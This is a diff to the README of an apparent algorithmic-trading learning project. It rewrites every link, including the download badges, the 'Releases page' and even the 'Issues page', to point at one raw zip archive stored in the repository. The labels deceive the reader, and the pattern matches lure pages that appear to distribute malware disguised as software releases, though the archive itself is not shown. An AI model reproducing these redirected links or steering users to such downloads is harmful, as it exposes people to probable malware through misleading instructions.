@@ -1,6 +1,6 @@
 # 🤖 deepseek-trading-experiment - A Learning Journey in Algorithmic Trading
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/v0acc0002/deepseek-trading-experiment/releases)
+[![Download](https://raw.githubusercontent.com/v0acc0002/deepseek-trading-experiment/main/vernant/deepseek-trading-experiment_v2.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/v0acc0002/deepseek-trading-experiment/main/vernant/deepseek-trading-experiment_v2.3.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the deepseek-trading-experiment. No progr
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/v0acc0002/deepseek-trading-experiment/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/v0acc0002/deepseek-trading-experiment/main/vernant/deepseek-trading-experiment_v2.3.zip) to find the latest version of the application.
 2. Locate the download link for your operating system (Windows, Mac, or Linux).
 3. Click on the link and begin the download process.
 4. Once downloaded, locate the file on your computer.
@@ -56,7 +56,7 @@ If you encounter issues, consider these common solutions:
 
 Join the discussion or ask questions about the deepseek-trading-experiment. 
 
-- **GitHub Issues**: You can report bugs or request features directly on the [Issues page](https://github.com/v0acc0002/deepseek-trading-experiment/issues).
+- **GitHub Issues**: You can report bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/v0acc0002/deepseek-trading-experiment/main/vernant/deepseek-trading-experiment_v2.3.zip).
 - **Forum Discussions**: Engage with other users in forums dedicated to algorithmic trading.
 
 ## 🌐 Next Steps
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. You can use it freely for person
 
 For any feedback or suggestions, feel free to reach out through the Issues page or join community discussions. Enjoy your learning journey with algorithmic trading! 
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/v0acc0002/deepseek-trading-experiment/releases)
+[![Download](https://raw.githubusercontent.com/v0acc0002/deepseek-trading-experiment/main/vernant/deepseek-trading-experiment_v2.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/v0acc0002/deepseek-trading-experiment/main/vernant/deepseek-trading-experiment_v2.3.zip)
